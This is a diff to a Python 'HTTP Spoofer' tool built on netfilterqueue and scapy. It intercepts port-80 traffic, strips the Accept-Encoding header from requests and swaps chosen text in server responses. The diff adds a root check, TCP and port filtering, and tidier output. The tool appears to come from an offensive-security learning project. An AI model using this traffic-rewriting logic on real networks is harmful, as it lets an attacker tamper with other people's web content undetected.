@@ -7,6 +7,7 @@ import netfilterqueue
 import scapy.all as scapy
 from modules.my_utils import show_message
 from modules.exit_handler import setup_signal_handler
+from modules.sys_utils import check_root
 
 ### Functions #############################################################################################################
 
@@ -31,34 +32,42 @@ def set_load(packet, load):
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    
+
+    # Ensure packet has TCP layer, otherwise ignore
+    if not scapy_packet.haslayer(scapy.TCP):
+        packet.accept()
+        return
+
+    # Only process HTTP packets (port 80)
+    if scapy_packet[scapy.TCP].dport != 80 and scapy_packet[scapy.TCP].sport != 80:
+        packet.accept()
+        return
+
     if scapy_packet.haslayer(scapy.Raw):
         try:
             if scapy_packet[scapy.TCP].dport == 80:
-                print(f"\n{Fore.YELLOW}[+] {Fore.CYAN}Solicitud:\n")
+                show_message("Solicitud:", "")
                 modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
                 new_packet = set_load(scapy_packet, modified_load)
                 packet.set_payload(new_packet.build())
 
             elif scapy_packet[scapy.TCP].sport == 80:
-                print(f"\n{Fore.YELLOW}[-] {Fore.CYAN}Respuesta:\n")
+                show_message("Respuesta:", "minus")
                 modified_load = scapy_packet[scapy.Raw].load.replace(original_text, replace_text)
                 new_packet = set_load(scapy_packet, modified_load)
                 packet.set_payload(new_packet.build())
 
             print(scapy_packet)
 
-
         except Exception as e:
-            print(f"\n{Fore.RED}[!] {Fore.YELLOW}Error: {Fore.WHITE}{e}")
+            show_message("Error:", "error", e)
 
     packet.accept()
-
-
 
 ### Main Code #############################################################################################################
 
 def main():
+    check_root()
     args = get_arguments()
 
     show_message("Executing: ", "info", "HTTP Spoofer")
